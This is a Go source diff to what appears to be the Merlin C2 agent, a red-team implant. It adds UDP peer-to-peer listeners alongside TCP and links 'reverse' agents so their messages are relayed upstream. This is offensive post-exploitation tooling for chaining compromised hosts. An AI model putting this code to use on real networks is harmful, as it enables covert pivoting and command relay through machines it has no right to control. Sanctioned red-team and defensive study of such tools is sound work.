@@ -36,8 +36,32 @@ import (
 	"github.com/Ne0nd0g/merlin-agent/p2p"
 )
 
-// listeners is a slice of instantiated network listeners
-var listeners []net.Listener
+const (
+	TCP = 0
+	UDP = 1
+)
+
+// p2pListener is a structure for managing and tracking peer to peer listeners created on this Agent
+type p2pListener struct {
+	Addr     string      // Addr is a string representation of the address the listener is communicating with
+	Type     int         // Type is the p2pListener type
+	Listener interface{} // Listener holds the connection (e.g., net.Listener for TCP and net.PacketConn for UDP)
+}
+
+// String returns a string representation of the p2pListener
+func (p *p2pListener) String() string {
+	switch p.Type {
+	case TCP:
+		return "TCP"
+	case UDP:
+		return "UDP"
+	default:
+		return fmt.Sprintf("commands/listener/p2pListener.String() unhandled p2pListener type %d", p.Type)
+	}
+}
+
+// p2pListeners is a slice of instantiated network listeners
+var p2pListeners []p2pListener
 
 // Listener binds to the provided interface and port and begins listening for incoming connections from other peer-to-peer agents
 func Listener(cmd jobs.Command) (results jobs.Results) {
@@ -50,9 +74,9 @@ func Listener(cmd jobs.Command) (results jobs.Results) {
 	// switch on first argument
 	switch strings.ToLower(cmd.Args[0]) {
 	case "list":
-		results.Stdout = fmt.Sprintf("Peer-to-Peer Listeners (%d):\n", len(listeners))
-		for _, listener := range listeners {
-			results.Stdout += fmt.Sprintf("%s\n", listener.Addr())
+		results.Stdout = fmt.Sprintf("Peer-to-Peer Listeners (%d):\n", len(p2pListeners))
+		for i, listener := range p2pListeners {
+			results.Stdout += fmt.Sprintf("%d. %s listener on %s\n", i, listener.String(), listener.Addr)
 		}
 		return
 	case "start":
@@ -61,12 +85,20 @@ func Listener(cmd jobs.Command) (results jobs.Results) {
 		}
 		switch strings.ToLower(cmd.Args[1]) {
 		case "tcp":
-			err := TCPListen(cmd.Args[2])
+			err := ListenTCP(cmd.Args[2])
 			if err != nil {
 				results.Stderr = err.Error()
 				return
 			}
 			results.Stdout = fmt.Sprintf("Successfully started TCP listener on %s", cmd.Args[2])
+			return
+		case "udp":
+			err := ListenUDP(cmd.Args[2])
+			if err != nil {
+				results.Stderr = err.Error()
+				return
+			}
+			results.Stdout = fmt.Sprintf("Successfully started UDP listener on %s", cmd.Args[2])
 			return
 		default:
 			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
@@ -77,19 +109,33 @@ func Listener(cmd jobs.Command) (results jobs.Results) {
 		}
 		switch strings.ToLower(cmd.Args[1]) {
 		case "tcp":
-			for i, listener := range listeners {
-				if listener.Addr().String() == cmd.Args[2] {
-					err := listener.Close()
+			for i, listener := range p2pListeners {
+				if listener.Listener.(net.Listener).Addr().String() == cmd.Args[2] {
+					err := listener.Listener.(net.Listener).Close()
 					if err != nil {
 						results.Stderr = err.Error()
 					} else {
-						results.Stdout = fmt.Sprintf("Succesfully closed listener on %s", cmd.Args[2])
+						results.Stdout = fmt.Sprintf("Succesfully closed TCP listener on %s", cmd.Args[2])
 					}
-					listeners = append(listeners[:i], listeners[i+1:]...)
+					p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
 					return
 				}
 			}
-			results.Stderr = fmt.Sprintf("Unable to find and close listener on %s", cmd.Args[2])
+			results.Stderr = fmt.Sprintf("Unable to find and close TCP listener on %s", cmd.Args[2])
+		case "udp":
+			for i, listener := range p2pListeners {
+				if listener.Listener.(net.PacketConn).LocalAddr().String() == cmd.Args[2] {
+					err := listener.Listener.(net.PacketConn).Close()
+					if err != nil {
+						results.Stderr = err.Error()
+					} else {
+						results.Stdout = fmt.Sprintf("Successfully closed UDP listener on %s", cmd.Args[2])
+					}
+					p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
+					return
+				}
+			}
+			results.Stderr = fmt.Sprintf("Unable to find and close UDP listener on %s", cmd.Args[2])
 		default:
 			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
 		}
@@ -102,28 +148,64 @@ func Listener(cmd jobs.Command) (results jobs.Results) {
 	return
 }
 
-// TCPListen binds to the provided address and listens for incoming TCP connections
-func TCPListen(addr string) error {
+// ListenTCP binds to the provided address and listens for incoming TCP connections
+func ListenTCP(addr string) error {
 	listener, err := net.Listen("tcp", addr)
 	if err != nil {
-		return fmt.Errorf("commands/listen.TCPListen(): there was an error listening on %s: %s", err, err)
+		return fmt.Errorf("commands/listen.TCPListen(): there was an error listening on %s : %s", addr, err)
 	}
 
 	// Add to global listeners
 	var ok bool
-	for _, l := range listeners {
-		if listener.Addr() == l.Addr() {
-			ok = true
+	for _, l := range p2pListeners {
+		if l.Type == TCP {
+			if listener.Addr() == l.Listener.(net.Listener).Addr() {
+				ok = true
+			}
 		}
+
 	}
 	if !ok {
-		listeners = append(listeners, listener)
+		p2pListeners = append(p2pListeners, p2pListener{
+			Addr:     listener.Addr().String(),
+			Type:     TCP,
+			Listener: listener,
+		})
 	}
 
 	cli.Message(cli.NOTE, fmt.Sprintf("Started TCP listener on %s and waiting for a connection...", addr))
 
 	// Listen for initial connection from upstream agent
 	go accept(listener)
+	return nil
+}
+
+// ListenUDP binds to the provided address and listens for incoming UDP connections
+func ListenUDP(addr string) error {
+	listener, err := net.ListenPacket("udp", addr)
+	if err != nil {
+		return fmt.Errorf("commands/listen.ListenUDP(): there was an error listening on %s : %s", addr, err)
+	}
+	cli.Message(cli.NOTE, fmt.Sprintf("Started UDP listener on %s and waiting for a connection...", addr))
+
+	// Add to global listeners
+	var ok bool
+	for _, l := range p2pListeners {
+		if l.Type == UDP {
+			if listener.LocalAddr() == l.Listener.(net.PacketConn).LocalAddr() {
+				ok = true
+			}
+		}
+	}
+	if !ok {
+		p2pListeners = append(p2pListeners, p2pListener{
+			Addr:     listener.LocalAddr().String(),
+			Type:     UDP,
+			Listener: listener,
+		})
+	}
+
+	go listenUDP(listener)
 	return nil
 }
 
@@ -139,7 +221,7 @@ func accept(listener net.Listener) {
 	}
 }
 
-// listen is an infinite loop to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
+// listen is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
 func listen(conn net.Conn) {
 	for {
 		data := make([]byte, 500000)
@@ -164,16 +246,60 @@ func listen(conn net.Conn) {
 		if !ok {
 			// Reverse TCP agents need to be added after initial checkin
 			linkedAgent := p2p.Agent{
-				In:   make(chan messages.Base, 100),
-				Out:  make(chan messages.Base, 100),
-				Conn: conn,
-				Type: p2p.TCPREVERSE,
+				In:     make(chan messages.Base, 100),
+				Out:    make(chan messages.Base, 100),
+				Conn:   conn,
+				Type:   p2p.TCPREVERSE,
+				Remote: conn.RemoteAddr(),
 			}
 			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
 		} else {
 			// Update the Agent's connection to the current one
 			linkedAgent := agent.(p2p.Agent)
 			linkedAgent.Conn = conn
+			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
+		}
+
+		// Add the message to the queue
+		p2p.AddDelegateMessage(msg)
+	}
+}
+
+// listenUDP is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
+func listenUDP(listener net.PacketConn) {
+	for {
+		data := make([]byte, 500000)
+		n, addr, err := listener.ReadFrom(data)
+		cli.Message(cli.NOTE, fmt.Sprintf("UDP listener read %d bytes from %s at %s", n, addr, time.Now().UTC()))
+		if err != nil {
+			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listenUDP(): there was an error accepting the UDP connection from %s : %s", addr, err))
+			break
+		}
+
+		// Gob decode the message
+		var msg messages.Delegate
+		reader := bytes.NewReader(data)
+		err = gob.NewDecoder(reader).Decode(&msg)
+		if err != nil {
+			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listenUDP(): there was an error gob decoding a delegate message: %s", err))
+			return
+		}
+
+		// Store LinkedAgent
+		agent, ok := p2p.LinkedAgents.Load(msg.Agent)
+		if !ok {
+			// Reverse UDP agents need to be added after initial checkin
+			linkedAgent := p2p.Agent{
+				In:     make(chan messages.Base, 100),
+				Out:    make(chan messages.Base, 100),
+				Type:   p2p.UDPREVERSE,
+				Conn:   listener,
+				Remote: addr,
+			}
+			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
+		} else {
+			// Update the Agent's connection to the current one
+			linkedAgent := agent.(p2p.Agent)
 			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
 		}
 
